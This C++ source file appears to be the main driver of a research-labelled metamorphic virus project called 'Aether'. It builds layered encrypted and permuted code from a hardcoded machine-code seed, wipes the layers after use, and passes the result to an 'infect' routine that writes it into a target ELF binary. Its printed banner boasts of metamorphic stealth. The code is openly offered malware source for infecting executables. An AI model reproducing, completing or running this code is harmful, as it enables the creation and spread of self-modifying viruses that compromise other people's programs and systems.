/**
 * SPDX-License-Identifier: LicenseRef-Aether-Research
 * Copyright (c) 2024–2026 Aether Research Project contributors.
 *
 * Licensed under the Aether Research License in the repository root file
 * LICENSE. Authorized lab / lawful private use only as defined there.
 * By using this file you accept LICENSE. See docs/LICENSE_ACCEPTANCE.md.
 */

/**
 * @file aether_next_main.cpp
 * @brief Crypto cascade peel + world-class permute (research init).
 *
 * Usage: aether_next [--fire|--idle-only] [elf-file]
 */

#include "aether/common/rng.hpp"
#include "aether/infect/infect.hpp"
#include "aether/runtime/lazy_jsr.hpp"

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

namespace {

const uint8_t kDemoSeed[] = {
    0x48, 0x31, 0xC0, 0x90, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xFF, 0xC0, 0x50, 0x58, 0x48,
    0x31, 0xC9, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x66, 0x90, 0x0F, 0x1F, 0x00, 0x48, 0x29, 0xC0,
    0xEB, 0x03, 0x90, 0x90, 0x90, 0x48, 0xFF, 0xC0, 0xC3, 0x90, 0x90, 0x48, 0x31, 0xC0,
};

const char* parse_args(int argc, char** argv, aether::LazyConfig& cfg) {
    const char* elf = nullptr;
    for (int i = 1; i < argc; i++) {
        if (std::strcmp(argv[i], "--fire") == 0) {
            cfg.force_fire = true;
            cfg.idle_ms = 0;
        } else if (std::strcmp(argv[i], "--idle-only") == 0) {
            cfg.idle_only = true;
        } else if (argv[i][0] != '-') {
            elf = argv[i];
        }
    }
    if (const char* e = std::getenv("AETHER_FIRE")) {
        if (e[0] == '1' || e[0] == 'y' || e[0] == 'Y') {
            cfg.force_fire = true;
            cfg.idle_ms = 0;
        }
    }
    return elf;
}

} // namespace

int main(int argc, char** argv) {
    aether::seed_rng();

    aether::LazyConfig cfg;
    cfg.idle_ms = 40;
    cfg.min_layers = 3;
    cfg.max_layers = 12;
    cfg.continue_pct = 65;
    const char* elf = parse_args(argc, argv, cfg);

    printf("============================================================\n");
    printf(" AETHER — Crypto cascade + strong metamorphic permute\n");
    printf("============================================================\n");
    printf(" + Idle: shit only\n");
    printf(" + JSR arm/clear (ephemeral edge)\n");
    printf(" + REAL onion encrypt/decrypt cascade (keystream layers)\n");
    printf(" + Peel wipes each layer when done\n");
    printf(" + world_class_permute / permute-heavy on scaffolds\n");
    printf(" + Live total stealth: NOT claimed (research honesty)\n\n");

    std::vector<uint8_t> body;
    aether::LazyResult lr =
        aether::run_lazy_jsr(kDemoSeed, sizeof(kDemoSeed), cfg, elf ? &body : nullptr);

    printf("\n[summary]\n");
    printf("  layers=%d wiped=%d peak=%zu impl=%s final=%zu\n",
           lr.layers,
           lr.layers_wiped,
           lr.peak_layer_bytes,
           lr.impl_emitted ? "yes" : "no",
           lr.generated_bytes);
    for (const auto& s : lr.layer_steps) {
        printf("  #%02d %-18s %zu B  → %s\n",
               s.index + 1,
               s.mode.c_str(),
               s.bytes,
               s.decision == aether::LayerDecision::EmitImpl ? "LEAF/IMPL" : "NEXT");
    }

    if (elf && !body.empty()) {
        aether::infect(elf, body);
        volatile uint8_t* p = body.data();
        for (size_t i = 0; i < body.size(); i++)
            p[i] = 0;
    } else if (!elf) {
        printf("\nUsage: %s [--fire|--idle-only] [elf-file]\n", argv[0]);
    }
    return 0;
}
